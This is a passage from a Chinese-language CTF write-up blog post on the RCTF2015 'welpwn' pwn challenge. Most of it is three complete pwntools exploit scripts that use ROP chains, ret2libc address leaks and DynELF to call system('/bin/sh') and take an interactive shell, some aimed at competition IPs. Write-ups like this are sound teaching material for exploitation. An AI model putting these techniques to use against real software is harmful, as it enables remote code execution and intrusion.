class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'remote'</span>]:</span><br><span class="line">        io = remote(<span class="string">'180.76.128.48'</span>,<span class="number">6666</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            io = gdb.debug(<span class="string">'./welpwn'</span>,<span class="string">'''</span></span><br><span class="line"><span class="string">                                        bp 0x4007CD</span></span><br><span class="line"><span class="string">                                        bp 0x400819</span></span><br><span class="line"><span class="string">                                        bp 0x400782</span></span><br><span class="line"><span class="string">                                        bp 0x400793</span></span><br><span class="line"><span class="string">                                        bp 0x4007C6'''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./welpwn'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">'\x00'</span>*<span class="number">8</span> <span class="comment"># \x00截断</span></span><br><span class="line">    rop = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">    <span class="keyword">while</span> len(payload) &lt; <span class="number">1024</span> - len(rop):</span><br><span class="line">        payload += rop</span><br><span class="line">    payload = payload.ljust(<span class="number">1024</span>,<span class="string">'B'</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">'Welcome to RCTF\n'</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recvuntil(<span class="string">'A'</span>*<span class="number">0x10</span>) <span class="comment"># printf("%s", flag);</span></span><br><span class="line">    data = io.recvuntil(<span class="string">'\n'</span>).strip(<span class="string">'\n'</span>) <span class="comment"># rop中调用puts函数打印puts函数地址</span></span><br><span class="line">    puts_addr = u64(data.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"puts_addr:"</span>,hex(puts_addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> puts_addr&amp;<span class="number">0xfff</span> != <span class="number">0x6A0</span>: <span class="comment"># 系统ASLR开启,不能保证每次main函数的rbp都符合条件</span></span><br><span class="line">        exit(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">    libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]<span class="comment"># 0x6F6A0</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">'system'</span>]<span class="comment"># 0x453A0</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span>,hex(system_addr)</span><br><span class="line">    binsh_addr = libc_base + <span class="number">0x18CE17</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"binsh_addr:"</span>,hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># \x00截断,main函数的rbp,之前的与现在的相差0x10,覆盖完rbp后,无法返回到rop代码,所以'B'*0x10用于调整rop位置</span></span><br><span class="line">    payload2 = <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">'\x00'</span>*<span class="number">8</span> + <span class="string">'B'</span>*<span class="number">0x10</span> </span><br><span class="line">    rop = p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(main_addr)</span><br><span class="line">    <span class="keyword">while</span> len(payload2) &lt; <span class="number">1024</span>:</span><br><span class="line">        payload2 += rop</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">'Welcome to RCTF\n'</span>)</span><br><span class="line">    <span class="comment"># 如果是send(),缓冲区中会有超过1024字节的那部分数据,没有换行符,会与输入的命令进行拼接</span></span><br><span class="line">    io.sendline(payload2) </span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    debug = <span class="number">0</span>	<span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p>
<h3 id="0x30-方法二：如果提供了libc-so，使用-libc-csu-init中的通用gadgets构造ROP-chain。ret2libc。"><a href="#0x30-方法二：如果提供了libc-so，使用-libc-csu-init中的通用gadgets构造ROP-chain。ret2libc。" class="headerlink" title="0x30 方法二：如果提供了libc.so，使用__libc_csu_init中的通用gadgets构造ROP chain。ret2libc。"></a>0x30 方法二：如果提供了libc.so，使用__libc_csu_init中的通用gadgets构造ROP chain。ret2libc。</h3><p><strong><code>利用思路</code></strong>：</p>
<p>1、构造<code>payload</code>，使其可以覆盖<code>echo()函数</code>的<code>返回地址</code>，返回到构造的<code>ROP chain</code>地址处。ROP chain主要是使用<code>__libc_csu_init</code>中的<code>通用gadgets</code>构造。执行完ROP chain，使程序返回<code>main()函数</code>起始地址，进行<code>下一次利用</code>。</p>
<p>2、利用分为<code>三个阶段</code>。</p>
<blockquote>
<p><code>第一阶段</code>：调用write()函数，<code>泄露</code>程序中使用到的任意<code>库函数的地址</code>。然后根据泄露出的库函数地址，以及所给libc.so，我们可以计算出libc.so的加载基址。再加上system()函数的偏移或“/bin/sh\x00”字符串的偏移，就可以计算出system()函数的地址以及“/bin/sh\x00”字符串的地址。<br><code>第二阶段</code>：调用read()函数，将计算出的<code>system()</code>函数地址以及<code>“/bin/sh\x00”</code>字符串地址，写到<code>.bss段</code>，以方便下次构造ROP chain。<br><code>第三阶段</code>：调用system(“/bin/sh”)获取shell。</p>
</blockquote>
<p><strong><code>完整exp</code></strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># libc版本: libc6_2.23-0ubuntu11.2_amd64</span></span><br><span class="line"><span class="comment"># 方法：使用__libc_csu_init中的通用gadgets构造ROP</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./welpwn'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./welpwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23_x86_64.so'</span>)</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = <span class="number">0x4007cd</span></span><br><span class="line">bss_addr = <span class="number">0x601270</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span> <span class="comment"># pop rdi;ret</span></span><br><span class="line">pop4_r12_ret = <span class="number">0x40089c</span> <span class="comment"># pop r12 r13 r14 r15;ret</span></span><br><span class="line">pop6_rbx_ret = <span class="number">0x40089a</span> <span class="comment"># pop rbx rbp r12 r13 r14 r15;ret</span></span><br><span class="line"><span class="comment"># __libc_csu_init中的通用gadgets</span></span><br><span class="line"><span class="comment"># mov   rdx, r13 ;</span></span><br><span class="line"><span class="comment"># mov   rsi, r14 ;</span></span><br><span class="line"><span class="comment"># mov   edi, r15d ;</span></span><br><span class="line"><span class="comment"># call  qword ptr [r12+rbx*8] ;</span></span><br><span class="line">mov_rdx_rsi_edi_call = <span class="number">0x400880</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x4007CD,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x400819,read()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x400782,flag[i] = 0;地址,修改rbp最低字节</span></span><br><span class="line"><span class="string">bp 0x400793,strcmp()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x4007C6,return printf("%s", flag);</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'remote'</span>]:</span><br><span class="line">        io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">53830</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            io = gdb.debug(<span class="string">'./welpwn'</span>,<span class="string">'''</span></span><br><span class="line"><span class="string">                                        bp 0x4007CD</span></span><br><span class="line"><span class="string">                                        bp 0x400819</span></span><br><span class="line"><span class="string">                                        bp 0x400782</span></span><br><span class="line"><span class="string">                                        bp 0x400793</span></span><br><span class="line"><span class="string">                                        bp 0x4007C6'''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./welpwn'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="comment"># echo()中的flag缓冲区,0x10字节。echo()返回地址下面就是main函数中大小为1024字节的缓冲区</span></span><br><span class="line">    <span class="comment"># flag[16],rbp,ret_addr</span></span><br><span class="line">    <span class="comment"># r12 = 'A'*8,r13 = 'A'*8,r14 = 'A'*8,r15 = pop4_r12_ret,ret_addr = pop6_rbx_ret</span></span><br><span class="line">    payload = <span class="number">0x18</span>*<span class="string">"A"</span> + p64(pop4_r12_ret)  </span><br><span class="line">    payload += p64(pop6_rbx_ret)</span><br><span class="line">    <span class="comment"># rbx = 0,rbp = 1,r12 = write_got,r13 = 8,r14 = write_got,r15 = 1</span></span><br><span class="line">    payload += p64(<span class="number">0x0</span>) + p64(<span class="number">0x1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>)  </span><br><span class="line">    <span class="comment"># mov   rdx, r13 ; rdx = r13 = 8</span></span><br><span class="line">    <span class="comment"># mov   rsi, r14 ; rsi = r14 = write_got</span></span><br><span class="line">    <span class="comment"># mov   edi, r15d ; edi = r15d = 1</span></span><br><span class="line">    <span class="comment"># call  qword ptr [r12+rbx*8] ; [r12+rbx*8] = [write_got]</span></span><br><span class="line">    payload += p64(mov_rdx_rsi_edi_call) <span class="comment"># write(1,write_got,8)</span></span><br><span class="line">    <span class="comment"># add rsp,8;pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret(7*8 = 56)</span></span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span></span><br><span class="line">    payload += p64(main_addr)</span><br><span class="line">    io.recvuntil(<span class="string">"Welcome to RCTF\n"</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    write_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"write_addr:"</span>,hex(write_addr)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"write_offset:"</span>,hex(libc.sym[<span class="string">'write'</span>])</span><br><span class="line">    libc_base_addr = write_addr - libc.sym[<span class="string">'write'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base_addr:"</span>,hex(libc_base_addr)</span><br><span class="line">    system_addr = libc_base_addr + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span>,hex(system_addr)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_offset:"</span>,hex(libc.sym[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">"A"</span>*<span class="number">0x18</span> + p64(pop4_r12_ret) </span><br><span class="line">    payload2 += p64(pop6_rbx_ret) </span><br><span class="line">    payload2 += p64(<span class="number">0x0</span>) + p64(<span class="number">0x1</span>) + p64(read_got) + p64(<span class="number">0x11</span>) + p64(bss_addr) + p64(<span class="number">0</span>) </span><br><span class="line">    payload2 += p64(mov_rdx_rsi_edi_call) <span class="comment"># read(0,bss_addr,0x11)</span></span><br><span class="line">    payload2 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">    payload2 += p64(main_addr)</span><br><span class="line">    io.recvuntil(<span class="string">"Welcome to RCTF\n"</span>)</span><br><span class="line">    io.sendline(payload2)</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh\x00"</span>+ p64(system_addr))</span><br><span class="line"></span><br><span class="line">    payload3 = <span class="string">"A"</span>*<span class="number">0x18</span> + p64(pop4_r12_ret)</span><br><span class="line">    payload3 += p64(pop6_rbx_ret) </span><br><span class="line">    payload3 += p64(<span class="number">0x0</span>) + p64(<span class="number">0x1</span>) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(bss_addr) </span><br><span class="line">    payload3 += p64(mov_rdx_rsi_edi_call) <span class="comment"># system("/bin/sh")</span></span><br><span class="line">    payload3 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">    payload3 += p64(main_addr)</span><br><span class="line">    io.recvuntil(<span class="string">"Welcome to RCTF\n"</span>)</span><br><span class="line">    io.sendline(payload3)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</span><br><span class="line">    debug = <span class="number">0</span>  <span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p>
<h3 id="0x40-方法三：如果未提供libc-so，使用pwntools的DynELF模块对库函数地址进行泄露。ret2libc。"><a href="#0x40-方法三：如果未提供libc-so，使用pwntools的DynELF模块对库函数地址进行泄露。ret2libc。" class="headerlink" title="0x40 方法三：如果未提供libc.so，使用pwntools的DynELF模块对库函数地址进行泄露。ret2libc。"></a>0x40 方法三：如果未提供libc.so，使用pwntools的DynELF模块对库函数地址进行泄露。ret2libc。</h3><p>&emsp;&emsp;使用此方法，编写exp时就比较简单了，因为很多工作都被<code>pwntools</code>封装好了，我们只需要<code>调用一下</code>就可以了。但是，不知道原理怎么行，所以，我决定重新写一篇文章进行<code>DynELF泄露原理</code>的介绍。</p>
<p>&emsp;&emsp;<code>DynELF</code>是<code>pwntools</code>中专门用来应对<code>没有libc情况</code>的漏洞利用模块，在提供一个<code>目标程序任意地址</code>的情况下，我们需要<code>实现一个函数</code>，此函数可以泄露<code>任意地址</code>的<code>任意数据</code>，现在则可以解析<code>任意加载库</code>的<code>任意符号地址</code>。</p>
<p><strong><code>模板</code>*</strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = remote(ip, port)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, enhex(data <span class="keyword">or</span> <span class="string">''</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">read_add = d.lookup(<span class="string">'read'</span>,<span class="string">'libc'</span>)</span><br></pre></td></tr></table></figure></p>
<p><strong><code>利用思路</code></strong>：</p>
<p>1、编写<code>任意地址</code>泄露<code>任意数据</code>函数。此函数中的payload的<code>ROP chain</code>，我们使用<code>__libc_csu_init</code>中的<code>通用gadgets</code>构造，通过调用<code>write()</code>函数，泄露<code>任意地址</code>的<code>8字节数据</code>。</p>
<p>2、通过<code>DynELF</code>中泄露符号地址的函数<code>lookup</code>，泄露<code>system()</code>函数地址和<code>gets()</code>函数地址。</p>
<p>3、待找到<code>libc</code>中<code>system()</code>函数地址和<code>gets()</code>函数地址，再构造<code>payload</code>，调用<code>gets()</code>函数，将<code>“/bin/sh”</code>写入到<code>“.bss”段</code>，再调用<code>system()</code>函数，获取shell。</p>
<p><strong><code>完整exp</code></strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 方法：未知libc.so版本,使用DynELF()泄露libc.so中的函数地址</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./welpwn'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./welpwn'</span>)</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = <span class="number">0x4007cd</span></span><br><span class="line">bss_addr = <span class="number">0x601270</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span> <span class="comment"># pop rdi;ret</span></span><br><span class="line">pop4_r12_ret = <span class="number">0x40089c</span> <span class="comment"># pop r12 r13 r14 r15;ret</span></span><br><span class="line">pop6_rbx_ret = <span class="number">0x40089a</span> <span class="comment"># pop rbx rbp r12 r13 r14 r15;ret</span></span><br><span class="line"><span class="comment"># __libc_csu_init中的通用gadgets</span></span><br><span class="line"><span class="comment"># mov   rdx, r13 ;</span></span><br><span class="line"><span class="comment"># mov   rsi, r14 ;</span></span><br><span class="line"><span class="comment"># mov   edi, r15d ;</span></span><br><span class="line"><span class="comment"># call  qword ptr [r12+rbx*8] ;</span></span><br><span class="line">mov_rdx_rsi_edi_call = <span class="number">0x400880</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x4007CD,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x400819,read()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x400782,flag[i] = 0;地址,修改rbp最低字节</span></span><br><span class="line"><span class="string">bp 0x400793,strcmp()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x4007C6,return printf("%s", flag);</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'remote'</span>]:</span><br><span class="line">        io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">53830</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            io = gdb.debug(<span class="string">'./welpwn'</span>,<span class="string">'''</span></span><br><span class="line"><span class="string">                                        bp 0x4007CD</span></span><br><span class="line"><span class="string">                                        bp 0x400819</span></span><br><span class="line"><span class="string">                                        bp 0x400782</span></span><br><span class="line"><span class="string">                                        bp 0x400793</span></span><br><span class="line"><span class="string">                                        bp 0x4007C6'''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./welpwn'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="number">0x18</span>*<span class="string">"A"</span> + p64(pop4_r12_ret)  </span><br><span class="line">    payload += p64(pop6_rbx_ret)</span><br><span class="line">    <span class="comment"># rbx = 0,rbp = 1,r12 = write_got,r13 = 8,r14 = addr,r15 = 1</span></span><br><span class="line">    payload += p64(<span class="number">0x0</span>) + p64(<span class="number">0x1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(addr) + p64(<span class="number">1</span>)  </span><br><span class="line">    <span class="comment"># mov   rdx, r13 ; rdx = r13 = 8</span></span><br><span class="line">    <span class="comment"># mov   rsi, r14 ; rsi = r14 = addr</span></span><br><span class="line">    <span class="comment"># mov   edi, r15d ; edi = r15d = 1</span></span><br><span class="line">    <span class="comment"># call  qword ptr [r12+rbx*8] ; [r12+rbx*8] = [write_got]</span></span><br><span class="line">    payload += p64(mov_rdx_rsi_edi_call) <span class="comment"># write(1,addr,8)</span></span><br><span class="line">    <span class="comment"># add rsp,8;pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret(7*8 = 56)</span></span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span></span><br><span class="line">    payload += p64(main_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    result = io.recv(<span class="number">8</span>)</span><br><span class="line">    io.recv(<span class="number">0x10</span> + <span class="number">0x1b</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x -&gt; %s"</span> %(addr, (result <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"Welcome to RCTF\n"</span>)</span><br><span class="line">    d = DynELF(leak,elf = ELF(<span class="string">'./welpwn'</span>))</span><br><span class="line">    system_addr = int(d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span>,hex(system_addr)</span><br><span class="line">    gets_addr = int(d.lookup(<span class="string">'gets'</span>,<span class="string">'libc'</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"gets_addr:"</span>,hex(gets_addr)</span><br><span class="line"></span><br><span class="line">    rop = p64(pop_rdi_ret) + p64(bss_addr) + p64(gets_addr) </span><br><span class="line">    rop += p64(pop_rdi_ret) + p64(bss_addr) + p64(system_addr)</span><br><span class="line">    rop += p64(main_addr)</span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x18</span> + p64(pop4_r12_ret)</span><br><span class="line">    payload += rop</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</span><br><span class="line">    debug = <span class="number">0</span>  <span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure></p>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2020/07/19/RCTF2015——WriteUp(Pwn)/">RCTF2015——WriteUp(Pwn)</a></p>
        <p><span>文章作者:</span><a href="/" title="访问 Sp4n9x 的个人博客">Sp4n9x</a></p>
        <p><span>发布时间:</span>2020-07-19, 00:00</p>
        <p><span>最后更新:</span>2020-10-03, 15:43</p>
        
            <p>
                <span>更新历史:</span><i class="fa fa-github"></i>
                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2020-07-19.RCTF2015——WriteUp(Pwn).md" title="顺序查看文章各部分修改记录" target = "_blank">Blame</a>,
                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2020-07-19.RCTF2015——WriteUp(Pwn).md" title="查看文章有关更新记录" target = "_blank">History</a><span class="raw">文本模式:</span><i class="fa fa-file-text-o"></i>
                <a href="https://raw.githubusercontent.com/Sp4n9x/blog_backup/blob/master/_posts/2020-07-19.RCTF2015——WriteUp(Pwn).md" title="查看 & 下载文章 Markdown 原始文本" target = "_blank"> .md Raw</a>
            </p>
        
        <p>
            <span>原始链接:</span><a class="post-url" href="/2020/07/19/RCTF2015——WriteUp(Pwn)/" title="RCTF2015——WriteUp(Pwn)">http://sp4n9x.github.io/2020/07/19/RCTF2015——WriteUp(Pwn)/</a>
            <span class="copy-path" data-clipboard-text="原文: http://sp4n9x.github.io/2020/07/19/RCTF2015——WriteUp(Pwn)/　　作者: Sp4n9x" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>

    
    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2020/08/15/ret2_dl_runtime_resolve详解/">
                    ret2_dl_runtime_resolve详解
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2020/07/05/ZCTF2016——WriteUp(Pwn)/">
                    ZCTF2016——WriteUp(Pwn)
                </a>
            </div>
        
    </nav>

  
